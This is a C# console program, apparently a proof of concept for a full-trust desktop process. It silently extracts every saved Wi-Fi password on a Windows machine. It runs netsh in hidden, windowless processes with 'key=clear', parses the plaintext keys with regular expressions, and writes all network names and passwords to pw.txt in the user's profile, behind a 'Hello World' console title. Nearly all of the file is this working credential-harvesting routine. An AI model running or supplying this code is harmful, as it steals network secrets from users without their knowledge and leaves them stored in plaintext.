using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace FullTrust
{
    class Program
    {
        static void Main(string[] args)
        {
            var result = get_Wifi_passwords();
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\TESTINGYOO.txt", "lolo");
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\pw.txt", result);
            Console.Title = "Hello World";
            Console.WriteLine("This process has access to the entire public desktop API surface");
        }

        private static string GetWifiNetworks()
        {
            //execute the netsh command using process class
            Process processWifi = new Process();
            processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processWifi.StartInfo.FileName = "netsh";
            processWifi.StartInfo.Arguments = "wlan show profile";

            processWifi.StartInfo.UseShellExecute = false;
            processWifi.StartInfo.RedirectStandardError = true;
            processWifi.StartInfo.RedirectStandardInput = true;
            processWifi.StartInfo.RedirectStandardOutput = true;
            processWifi.StartInfo.CreateNoWindow = true;
            processWifi.Start();

            string output = processWifi.StandardOutput.ReadToEnd();

            processWifi.WaitForExit();
            return output;
        }

        private static string ReadPassword(string Wifi_Name)
        {

            string argument = "wlan show profile name=\"" + Wifi_Name + "\" key=clear";
            Process processWifi = new Process();
            processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processWifi.StartInfo.FileName = "netsh";
            processWifi.StartInfo.Arguments = argument;


            processWifi.StartInfo.UseShellExecute = false;
            processWifi.StartInfo.RedirectStandardError = true;
            processWifi.StartInfo.RedirectStandardInput = true;
            processWifi.StartInfo.RedirectStandardOutput = true;
            processWifi.StartInfo.CreateNoWindow = true;
            processWifi.Start();

            string output = processWifi.StandardOutput.ReadToEnd();

            processWifi.WaitForExit();
            return output;
        }

        private static string GetWifiPassword(string Wifi_Name)
        {
            string get_password = ReadPassword(Wifi_Name);
            using (StringReader reader = new StringReader(get_password))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    Regex regex2 = new Regex(@"Key Content * : (?<after>.*)");
                    Match match2 = regex2.Match(line);

                    if (match2.Success)
                    {
                        string current_password = match2.Groups["after"].Value;
                        return current_password;
                    }
                }
            }
            return "Open Network - NO PASSWORD";
        }

        // main Method 
        private static string get_Wifi_passwords()
        {
            var result = "";
            string WifiNetworks = GetWifiNetworks();
            using (StringReader reader = new StringReader(WifiNetworks))
            {

                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    //wifiCount++;
                    Regex regex1 = new Regex(@"All User Profile * : (?<after>.*)");
                    Match match1 = regex1.Match(line);

                    if (match1.Success)
                    {
                        //Wifi_count_names++;
                        string Wifi_name = match1.Groups["after"].Value;
                        string Wifi_password = GetWifiPassword(Wifi_name);
                        result += Environment.NewLine;
                        result += Wifi_name + Wifi_password;
                        //listView1.Items.Add(Wifi_name).SubItems.Add(Wifi_password);
                    }
                }
            }
            return result;

        }
    }
}
